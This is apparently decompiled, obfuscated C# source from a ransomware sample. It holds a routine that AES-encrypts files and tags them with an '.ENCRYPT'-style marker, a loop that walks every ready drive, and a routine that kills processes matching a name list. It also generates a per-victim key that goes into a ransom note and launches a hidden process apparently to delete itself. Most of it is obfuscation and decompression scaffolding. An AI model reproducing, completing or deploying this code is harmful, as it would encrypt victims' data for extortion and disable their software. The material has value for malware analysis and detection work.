    static unsafe bool \u0001([In] \u0005.\u0001 obj0, [In] byte[] obj1, [In] string obj2, [In] string obj3)
    {
      // ISSUE: untyped stack allocation
      IntPtr num1 = __untypedstackalloc(5);
      if (true)
        goto label_45;
label_1:
      void* voidPtr;
      try
      {
        byte[] numArray = new byte[8];
        if (obj0 == \u0005.\u0001.\u0002)
          goto label_42;
label_14:
        if (obj0 == \u0005.\u0001.\u0001)
          new RNGCryptoServiceProvider().GetNonZeroBytes(numArray);
        RijndaelManaged rijndaelManaged;
        do
        {
          rijndaelManaged = new RijndaelManaged();
          rijndaelManaged.Mode = CipherMode.CBC;
          rijndaelManaged.KeySize = 256;
          rijndaelManaged.BlockSize = 128;
        }
        while (false);
        rijndaelManaged.Padding = PaddingMode.PKCS7;
        Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(\u0001.\u0003.\u0001(obj1), numArray, 5000);
        rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
        rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
        using (FileStream fileStream1 = new FileStream(obj2, FileMode.Open, FileAccess.Read))
        {
          using (FileStream fileStream2 = new FileStream(obj3, FileMode.CreateNew, FileAccess.Write))
          {
            CryptoStream cryptoStream1;
            if (obj0 == \u0005.\u0001.\u0001)
              cryptoStream1 = new CryptoStream((Stream) fileStream1, rijndaelManaged.CreateEncryptor(rijndaelManaged.Key, rijndaelManaged.IV), CryptoStreamMode.Read);
            else
              goto label_27;
label_21:
            if (true)
              goto label_23;
label_22:
            int num2;
            fileStream2.WriteByte((byte) num2);
label_23:
            int num3;
            num2 = num3 = cryptoStream1.ReadByte();
            int num4 = -1;
label_24:
            if (num3 == num4)
              cryptoStream1.Flush();
            else
              goto label_22;
label_26:
            byte[] bytes = Encoding.UTF8.GetBytes(\u0003.\u0002.\u0001(107388445));
            fileStream2.Write(numArray, 0, numArray.Length);
            fileStream2.Write(bytes, 0, bytes.Length);
label_27:
            if (obj0 == \u0005.\u0001.\u0002)
            {
              CryptoStream cryptoStream2 = new CryptoStream((Stream) fileStream1, rijndaelManaged.CreateDecryptor(rijndaelManaged.Key, rijndaelManaged.IV), CryptoStreamMode.Read);
              while (true)
              {
                int num5 = cryptoStream2.ReadByte();
                if (false)
                {
                  num4 = num5;
                  num3 = num5;
                  goto label_24;
                }
                else
                {
                  num2 = num5;
                  if (num5 != -1)
                  {
                    fileStream2.WriteByte((byte) num2);
                  }
                  else
                  {
                    cryptoStream2.Flush();
                    goto label_34;
                  }
                }
              }
              goto label_26;
            }
label_34:
            if (false)
              goto label_21;
          }
        }
        *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) 1;
        goto label_44;
label_42:
        FileStream fileStream = new FileStream(obj2, FileMode.Open, FileAccess.ReadWrite);
        try
        {
          fileStream.Seek(-16L, SeekOrigin.End);
          byte[] buffer = new byte[16];
          do
          {
            fileStream.Read(buffer, 0, buffer.Length);
            if (buffer[numArray.Length] == (byte) 46 || buffer[numArray.Length + 1] == (byte) 69 || buffer[numArray.Length + 2] == (byte) 78)
              goto label_7;
          }
          while (false);
          if (buffer[numArray.Length + 3] != (byte) 67 && buffer[numArray.Length + 4] != (byte) 82 && buffer[numArray.Length + 5] != (byte) 89 && buffer[numArray.Length + 6] != (byte) 80 && buffer[numArray.Length + 7] != (byte) 84)
          {
            *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) 0;
            goto label_44;
          }
label_7:
          fileStream.SetLength(Math.Max(0L, fileStream.Length - 16L));
          *(int*) voidPtr = 0;
          while (*(int*) voidPtr < numArray.Length)
          {
            numArray[*(int*) voidPtr] = buffer[*(int*) voidPtr];
            *(int*) voidPtr = *(int*) voidPtr + 1;
          }
          goto label_14;
        }
        finally
        {
          while (fileStream != null)
          {
            if (true)
            {
              fileStream.Dispose();
              break;
            }
          }
        }
      }
      catch (Exception ex)
      {
        *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) 0;
      }
label_44:
      return (bool) *(sbyte*) ((IntPtr) voidPtr + 4);
label_45:
      voidPtr = (void*) num1;
      goto label_1;
    }

    static unsafe void \u0001()
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
      try
      {
        Process[] processes = Process.GetProcesses();
        *(int*) voidPtr = 0;
        while (*(int*) voidPtr < processes.Length)
        {
          Process process = processes[*(int*) voidPtr];
          string[] strArray = \u0004.\u0003.\u0001;
          *(int*) ((IntPtr) voidPtr + 4) = 0;
          while (true)
          {
            int num = *(int*) ((IntPtr) voidPtr + 4);
            if (true)
              goto label_11;
label_4:
            int id = Process.GetCurrentProcess().Id;
            if (num != id)
            {
              try
              {
                if (true)
                  process.Kill();
              }
              catch (Exception ex)
              {
              }
            }
label_9:
            *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) + 1;
            continue;
label_11:
            int length = strArray.Length;
            if (num < length)
            {
              string str = strArray[*(int*) ((IntPtr) voidPtr + 4)];
              if (process.ProcessName.ToLower().Contains(str))
              {
                num = process.Id;
                goto label_4;
              }
              else
                goto label_9;
            }
            else
              break;
          }
          *(int*) voidPtr = *(int*) voidPtr + 1;
        }
      }
      catch (Exception ex)
      {
      }
    }

    static unsafe int \u0001([In] int obj0, [In] int obj1, [In] byte[] obj2, [In] \u0004.\u0005.\u0003 obj3)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(12);
      int num1;
      int num2;
      do
      {
        *(int*) voidPtr = obj3.\u0001;
        num1 = obj1;
        num2 = obj3.\u0002;
        if (true)
        {
          if (true)
          {
            if (num1 <= num2)
              goto label_17;
            else
              goto label_16;
label_4:
            *(int*) ((IntPtr) voidPtr + 4) = obj1;
            continue;
label_16:
            obj1 = obj3.\u0002;
            goto label_4;
label_17:
            *(int*) voidPtr = obj3.\u0001 - obj3.\u0002 + obj1 & (int) short.MaxValue;
            goto label_4;
          }
          else
            goto label_10;
        }
        else
          goto label_12;
      }
      while (false);
      if (true)
      {
        *(int*) ((IntPtr) voidPtr + 8) = obj1 - *(int*) voidPtr;
        int num3 = *(int*) ((IntPtr) voidPtr + 8);
        int num4 = 0;
        if (num4 == 0)
        {
          if (num3 > num4)
            Array.Copy((Array) obj3.\u0001, 32768 - *(int*) ((IntPtr) voidPtr + 8), (Array) obj2, obj0, *(int*) ((IntPtr) voidPtr + 8));
          else
            goto label_11;
        }
        else
        {
          num2 = num4;
          num1 = num3;
          goto label_10;
        }
      }
      int num5 = obj0;
      num2 = *(int*) ((IntPtr) voidPtr + 8);
      num1 = num5;
label_10:
      obj0 = num1 + num2;
      obj1 = *(int*) voidPtr;
label_11:
      Array.Copy((Array) obj3.\u0001, *(int*) voidPtr - obj1, (Array) obj2, obj0, obj1);
      obj3.\u0002 -= *(int*) ((IntPtr) voidPtr + 4);
      int num6 = obj3.\u0002;
      num2 = 0;
      num1 = num6;
label_12:
      if (num1 < num2)
        throw new InvalidOperationException();
      return *(int*) ((IntPtr) voidPtr + 4);
    }

    static void \u0001([In] \u0004.\u0005.\u0003 obj0, [In] int obj1, [In] int obj2, [In] int obj3)
    {
      if (false)
        return;
      while (true)
      {
        int num1 = obj2;
        int num2;
        while (true)
        {
          num2 = num1 - 1;
          if (false)
            num1 = num2;
          else
            break;
        }
        obj2 = num2;
        if (num1 > 0)
        {
          byte[] numArray = obj0.\u0001;
          \u0004.\u0005.\u0003 obj = obj0;
          int num3 = obj0.\u0001;
          int num4 = num3 + 1;
          obj.\u0001 = num4;
          int index = num3;
          int num5 = (int) obj0.\u0001[obj1++];
          numArray[index] = (byte) num5;
          obj0.\u0001 &= (int) short.MaxValue;
          int num6 = obj1;
          if (true)
            num6 &= (int) short.MaxValue;
          obj1 = num6;
        }
        else
          break;
      }
    }

    static void \u0001()
    {
      int length1 = 128;
      while (true)
      {
        byte[] data = new byte[length1];
        new RNGCryptoServiceProvider().GetNonZeroBytes(data);
        \u0001.\u0002.\u0001 = data;
        byte[] inArray = \u0001.\u0003.\u0001(\u0003.\u0001.\u0001, data);
        \u0003.\u0001.\u0003 = \u0003.\u0001.\u0003.Replace(\u0003.\u0002.\u0001(107388432), \u0003.\u0001.\u0005);
        \u0003.\u0001.\u0003 = \u0003.\u0001.\u0003.Replace(\u0003.\u0002.\u0001(107388899), \u0003.\u0001.\u0006);
        \u0003.\u0001.\u0003 = \u0003.\u0001.\u0003.Replace(\u0003.\u0002.\u0001(107388918), Convert.ToBase64String(inArray));
        \u0001.\u0003.\u0001();
        \u0001.\u0002.\u0001();
        do
          ;
        while (false);
        DriveInfo[] drives = DriveInfo.GetDrives();
        int index;
        do
        {
          index = 0;
        }
        while (false);
        int num1;
        while (true)
        {
          num1 = index;
          int num2;
          while (true)
          {
            int length2 = drives.Length;
            if (false)
            {
              num2 = length2;
              goto label_14;
            }
            else if (num1 < length2)
            {
              DriveInfo driveInfo = drives[index];
              int num3 = driveInfo.IsReady ? 1 : 0;
              if (true)
              {
                if (num3 != 0)
                  \u0001.\u0001.\u0001(driveInfo);
                num1 = index;
                break;
              }
              num1 = num3;
            }
            else
            {
              Process.Start(new ProcessStartInfo()
              {
                Arguments = \u0003.\u0002.\u0001(107388873) + Application.ExecutablePath + \u0003.\u0002.\u0001(107388856),
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = \u0003.\u0002.\u0001(107388851)
              });
              return;
            }
          }
          if (true)
            num2 = 1;
          else
            break;
label_14:
          index = num1 + num2;
        }
        length1 = num1;
      }
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static \u0004.\u0005.\u0004 \u0001([In] \u0004.\u0005.\u0005 obj0)
    {
      byte[] destinationArray = new byte[obj0.\u0003];
      Array.Copy((Array) obj0.\u0002, obj0.\u0002, (Array) destinationArray, 0, obj0.\u0003);
      return new \u0004.\u0005.\u0004(destinationArray);
    }

    static unsafe int \u0001([In] byte[] obj0, [In] \u0004.\u0005.\u0001 obj1, [In] int obj2, [In] int obj3)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
      *(int*) voidPtr = 0;
      int num1;
      int num2;
      do
      {
        num1 = obj1.\u0001;
        num2 = 11;
        if (num2 != 0)
        {
          if (num1 != num2)
            goto label_8;
label_3:
          if (!\u0001.\u0003.\u0001(obj1))
          {
            int num3 = obj1.\u0001.\u0002;
            num2 = 0;
            num1 = num3;
            goto label_5;
          }
          else
            continue;
label_8:
          *(int*) ((IntPtr) voidPtr + 4) = \u0001.\u0003.\u0001(obj3, obj2, obj0, obj1.\u0001);
          obj3 += *(int*) ((IntPtr) voidPtr + 4);
          *(int*) voidPtr = *(int*) voidPtr + *(int*) ((IntPtr) voidPtr + 4);
          obj2 -= *(int*) ((IntPtr) voidPtr + 4);
          if (obj2 != 0)
            goto label_3;
          else
            goto label_2;
        }
label_5:;
      }
      while (num1 > num2 && obj1.\u0001 != 11);
      goto label_6;
label_2:
      return *(int*) voidPtr;
label_6:
      return *(int*) voidPtr;
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static ICryptoTransform \u0001([In] byte[] obj0, [In] byte[] obj1, [In] bool obj2)
    {
      ICryptoTransform cryptoTransform1;
      using (SymmetricAlgorithm symmetricAlgorithm = (SymmetricAlgorithm) new RijndaelManaged())
      {
        ICryptoTransform cryptoTransform2;
        while (!obj2)
        {
          if (true)
          {
            cryptoTransform2 = symmetricAlgorithm.CreateEncryptor(obj1, obj0);
            goto label_3;
          }
        }
        goto label_5;
label_3:
        cryptoTransform1 = cryptoTransform2;
        if (true)
          goto label_9;
label_5:
        cryptoTransform2 = symmetricAlgorithm.CreateDecryptor(obj1, obj0);
        goto label_3;
      }
label_9:
      return cryptoTransform1;
    }

    static string \u0001([In] int obj0)
    {
      int num1 = obj0;
      byte[] numArray1 = \u0003.\u0002.\u0001;
      int index1 = num1;
      int index2 = index1 + 1;
      int num2 = (int) numArray1[index1];
      if ((num2 & 128) != 0)
        goto label_10;
      else
        goto label_9;
label_4:
      int count;
      try
      {
        byte[] bytes = Convert.FromBase64String(Encoding.UTF8.GetString(\u0003.\u0002.\u0001, index2, count));
        string str = string.Intern(Encoding.UTF8.GetString(bytes, 0, bytes.Length));
        if (\u0003.\u0002.\u0001)
          \u0001.\u0003.\u0001(obj0, str);
        return str;
      }
      catch
      {
        return (string) null;
      }
label_9:
      count = num2;
      if (count == 0)
        return string.Empty;
      goto label_4;
label_10:
      if ((num2 & 64) == 0)
      {
        count = ((num2 & 63) << 8) + (int) \u0003.\u0002.\u0001[index2++];
        goto label_4;
      }
      else
      {
        int num3 = (num2 & 31) << 24;
        byte[] numArray2 = \u0003.\u0002.\u0001;
        int index3 = index2;
        int num4 = index3 + 1;
        int num5 = (int) numArray2[index3] << 16;
        int num6 = num3 + num5;
        byte[] numArray3 = \u0003.\u0002.\u0001;
        int index4 = num4;
        int num7 = index4 + 1;
        int num8 = (int) numArray3[index4] << 8;
        int num9 = num6 + num8;
        byte[] numArray4 = \u0003.\u0002.\u0001;
        int index5 = num7;
        index2 = index5 + 1;
        int num10 = (int) numArray4[index5];
        count = num9 + num10;
        goto label_4;
      }
    }

    static bool \u0001([In] Assembly obj0, [In] Assembly obj1) => true;

    static string \u0001([In] int obj0)
    {
      object obj = \u0003.\u0002.\u0001;
      Monitor.Enter(obj);
      string str1;
      try
      {
        string str2;
        \u0003.\u0002.\u0001.TryGetValue(obj0, out str2);
        if (false)
          goto label_3;
        else
          goto label_4;
label_2:
        if (true)
          str1 = str2;
        else
          goto label_8;
label_3:
        if (false)
          goto label_2;
        else
          goto label_9;
label_4:
        switch (str2)
        {
          case null:
            break;
          default:
            goto label_2;
        }
      }
      finally
      {
        do
        {
          Monitor.Exit(obj);
        }
        while (false);
      }
label_8:
      if (true)
        return \u0001.\u0003.\u0001(obj0);
label_9:
      return str1;
    }

    static void \u0001([In] int obj0, [In] int obj1, [In] \u0004.\u0005.\u0002 obj2, [In] byte[] obj3)
    {
      if (true)
        goto label_6;
label_4:
      obj2.\u0003 += 8;
label_5:
      obj2.\u0001 = obj3;
      obj2.\u0001 = obj0;
      int num;
      obj2.\u0002 = num;
      return;
label_6:
      if (obj2.\u0001 < obj2.\u0002)
        throw new InvalidOperationException();
      num = obj0 + obj1;
      if (0 > obj0 || obj0 > num || num > obj3.Length)
        throw new ArgumentOutOfRangeException();
      if ((obj1 & 1) != 0)
      {
        obj2.\u0001 |= (uint) (((int) obj3[obj0++] & (int) byte.MaxValue) << obj2.\u0003);
        goto label_4;
      }
      else
        goto label_5;
    }

    static void \u0001([In] int obj0, [In] string obj1)
    {
      try
      {
        do
        {
          object obj;
          do
          {
            obj = \u0003.\u0002.\u0001;
          }
          while (false);
          Monitor.Enter(obj);
          try
          {
            do
            {
              do
              {
                \u0003.\u0002.\u0001.Add(obj0, obj1);
              }
              while (false);
            }
            while (false);
          }
          finally
          {
            Monitor.Exit(obj);
          }
        }
        while (false);
      }
      catch
      {
      }
    }

    static int \u0001([In] \u0004.\u0005.\u0002 obj0) => obj0.\u0003;

    static void \u0001([In] \u0004.\u0005.\u0003 obj0, [In] int obj1, [In] int obj2)
    {
      if ((obj0.\u0002 += obj1) > 32768)
        throw new InvalidOperationException();
      int sourceIndex = obj0.\u0001 - obj2 & (int) short.MaxValue;
      int num1 = 32768 - obj1;
      if (sourceIndex <= num1 && obj0.\u0001 < num1)
      {
        if (obj1 <= obj2)
        {
          Array.Copy((Array) obj0.\u0001, sourceIndex, (Array) obj0.\u0001, obj0.\u0001, obj1);
          obj0.\u0001 += obj1;
        }
        else
        {
          while (obj1-- > 0)
          {
            byte[] numArray = obj0.\u0001;
            \u0004.\u0005.\u0003 obj = obj0;
            int num2 = obj0.\u0001;
            int num3 = num2 + 1;
            obj.\u0001 = num3;
            int index = num2;
            int num4 = (int) obj0.\u0001[sourceIndex++];
            numArray[index] = (byte) num4;
          }
        }
      }
      else
        \u0001.\u0003.\u0001(obj0, sourceIndex, obj1, obj2);
    }

    static bool \u0001([In] \u0004.\u0005.\u0002 obj0) => obj0.\u0001 == obj0.\u0002;

    static int \u0001([In] \u0004.\u0005.\u0007 obj0) => \u0001.\u0003.\u0001(obj0) | \u0001.\u0003.\u0001(obj0) << 16;

    static FileInfo[] \u0001([In] string obj0)
    {
      FileInfo[] fileInfoArray;
      try
      {
        if (true)
          fileInfoArray = new DirectoryInfo(obj0).GetFiles();
      }
      catch (Exception ex)
      {
        fileInfoArray = (FileInfo[]) null;
      }
      return fileInfoArray;
    }

    static unsafe int \u0001([In] \u0004.\u0005.\u0003 obj0, [In] \u0004.\u0005.\u0002 obj1, [In] int obj2)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
      int val1 = obj2;
      int val2 = 32768;
      if (val2 != 0)
        val2 -= obj0.\u0002;
      obj2 = Math.Min(Math.Min(val1, val2), \u0001.\u0003.\u0001(obj1));
      *(int*) ((IntPtr) voidPtr + 4) = 32768 - obj0.\u0001;
      if (obj2 > *(int*) ((IntPtr) voidPtr + 4))
      {
        *(int*) voidPtr = \u0001.\u0003.\u0001(obj1, obj0.\u0001, obj0.\u0001, *(int*) ((IntPtr) voidPtr + 4));
        if (*(int*) voidPtr == *(int*) ((IntPtr) voidPtr + 4))
          *(int*) voidPtr = *(int*) voidPtr + \u0001.\u0003.\u0001(obj1, obj0.\u0001, 0, obj2 - *(int*) ((IntPtr) voidPtr + 4));
      }
      else
        *(int*) voidPtr = \u0001.\u0003.\u0001(obj1, obj0.\u0001, obj0.\u0001, obj2);
      obj0.\u0001 = obj0.\u0001 + *(int*) voidPtr & (int) short.MaxValue;
      obj0.\u0002 += *(int*) voidPtr;
      return *(int*) voidPtr;
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static unsafe bool \u0001([In] \u0004.\u0005.\u0005 obj0, [In] \u0004.\u0005.\u0002 obj1)
    {
      // ISSUE: untyped stack allocation
      IntPtr num1 = __untypedstackalloc(12);
      void* voidPtr;
      if (true)
        voidPtr = (void*) num1;
label_45:
      *(int*) voidPtr = obj0.\u0001;
label_46:
      int num2;
      int num3;
      int num4;
      int num5;
      int num6;
      int num7;
      int num8;
      switch (*(int*) voidPtr)
      {
        case 0:
          obj0.\u0002 = \u0001.\u0003.\u0001(obj1, 5);
          goto label_48;
        case 1:
label_5:
          obj0.\u0003 = \u0001.\u0003.\u0001(obj1, 5);
          if (obj0.\u0003 < 0)
            return false;
          ++obj0.\u0003;
          \u0001.\u0003.\u0001(obj1, 5);
          obj0.\u0005 = obj0.\u0002 + obj0.\u0003;
          obj0.\u0002 = new byte[obj0.\u0005];
          obj0.\u0001 = 2;
          goto case 2;
        case 2:
          if (true)
          {
            obj0.\u0004 = \u0001.\u0003.\u0001(obj1, 4);
            int num9 = obj0.\u0004;
            int num10 = 0;
            if (num10 == 0)
            {
              if (num9 < num10)
                return false;
              obj0.\u0004 += 4;
              \u0001.\u0003.\u0001(obj1, 4);
              obj0.\u0001 = new byte[19];
              break;
            }
            num5 = num10;
            num4 = num9;
            goto label_39;
          }
          else
            goto label_46;
        case 3:
label_17:
          for (; obj0.\u0007 < obj0.\u0004; ++obj0.\u0007)
          {
            *(int*) ((IntPtr) voidPtr + 4) = \u0001.\u0003.\u0001(obj1, 3);
            if (*(int*) ((IntPtr) voidPtr + 4) < 0)
              return false;
            \u0001.\u0003.\u0001(obj1, 3);
            obj0.\u0001[\u0004.\u0005.\u0005.\u0003[obj0.\u0007]] = (byte) *(int*) ((IntPtr) voidPtr + 4);
          }
          obj0.\u0001 = new \u0004.\u0005.\u0004(obj0.\u0001);
          obj0.\u0001 = (byte[]) null;
          obj0.\u0007 = 0;
          obj0.\u0001 = 4;
          goto case 4;
        case 4:
label_22:
          num6 = (num2 = \u0001.\u0003.\u0001(obj0.\u0001, obj1)) & -16;
          goto label_23;
        case 5:
label_30:
          *(int*) ((IntPtr) voidPtr + 8) = \u0004.\u0005.\u0005.\u0002[obj0.\u0006];
          if (true)
          {
            int num11 = \u0001.\u0003.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 8));
            if (num11 < 0)
            {
              int num12 = 0;
              if (num12 == 0)
                return num12 != 0;
              num7 = num12;
              goto label_20;
            }
            else
            {
              \u0001.\u0003.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 8));
              int num13 = num11;
              if (false)
              {
                num6 = num13;
                goto label_23;
              }
              else
              {
                int num14 = \u0004.\u0005.\u0005.\u0001[obj0.\u0006];
                int num15 = num13 + num14;
                if (false)
                {
                  num8 = num15;
                  goto label_27;
                }
                else
                {
                  num3 = num15;
                  goto label_37;
                }
              }
            }
          }
          else
            break;
        default:
          goto label_45;
      }
      obj0.\u0007 = 0;
      obj0.\u0001 = 3;
      goto label_17;
label_20:
      int num16 = obj0.\u0005;
      if (num7 == num16)
        return true;
      goto label_22;
label_23:
      if (num6 == 0)
      {
        byte[] numArray = obj0.\u0002;
        \u0004.\u0005.\u0005 obj = obj0;
        *(int*) voidPtr = obj0.\u0007;
        int num17 = *(int*) voidPtr + 1;
        obj.\u0007 = num17;
        int index = *(int*) voidPtr;
        int num18 = (int) (obj0.\u0001 = (byte) num2);
        numArray[index] = (byte) num18;
        num7 = obj0.\u0007;
        goto label_20;
      }
      else
      {
        if (num2 < 0)
          return false;
        num8 = num2;
      }
label_27:
      if (num8 >= 17)
        obj0.\u0001 = (byte) 0;
      obj0.\u0006 = num2 - 16;
      obj0.\u0001 = 5;
      goto label_30;
label_37:
      int num19;
      num4 = num19 = num3;
label_38:
      num5 = num19 - 1;
label_39:
      num3 = num5;
      if (num4 > 0)
      {
        byte[] numArray = obj0.\u0002;
        \u0004.\u0005.\u0005 obj = obj0;
        *(int*) voidPtr = obj0.\u0007;
        int num20 = *(int*) voidPtr + 1;
        obj.\u0007 = num20;
        int index = *(int*) voidPtr;
        int num21 = (int) obj0.\u0001;
        numArray[index] = (byte) num21;
        goto label_37;
      }
      else
      {
        if (obj0.\u0007 == obj0.\u0005)
          return true;
        obj0.\u0001 = 4;
        if (true)
          goto label_45;
      }
label_48:
      num4 = obj0.\u0002;
      num19 = 0;
      if (num19 == 0)
      {
        if (num4 < num19)
          return false;
        obj0.\u0002 += 257;
        \u0001.\u0003.\u0001(obj1, 5);
        obj0.\u0001 = 1;
        goto label_5;
      }
      else
        goto label_38;
    }

    static \u0004.\u0005.\u0004 \u0001([In] \u0004.\u0005.\u0005 obj0)
    {
      byte[] destinationArray = new byte[obj0.\u0002];
      Array.Copy((Array) obj0.\u0002, 0, (Array) destinationArray, 0, obj0.\u0002);
      return new \u0004.\u0005.\u0004(destinationArray);
    }

    static ICryptoTransform \u0001([In] bool obj0, [In] byte[] obj1, [In] byte[] obj2)
    {
      ICryptoTransform cryptoTransform1;
      using (DESCryptoServiceProvider cryptoServiceProvider = new DESCryptoServiceProvider())
      {
        ICryptoTransform cryptoTransform2;
        while (!obj0)
        {
          if (true)
          {
            cryptoTransform2 = cryptoServiceProvider.CreateEncryptor(obj2, obj1);
            goto label_3;
          }
        }
        goto label_5;
label_3:
        cryptoTransform1 = cryptoTransform2;
        if (true)
          goto label_9;
label_5:
        cryptoTransform2 = cryptoServiceProvider.CreateDecryptor(obj2, obj1);
        goto label_3;
      }
label_9:
      return cryptoTransform1;
    }

    static int \u0001([In] \u0004.\u0005.\u0003 obj0) => 32768 - obj0.\u0002;
  }
}
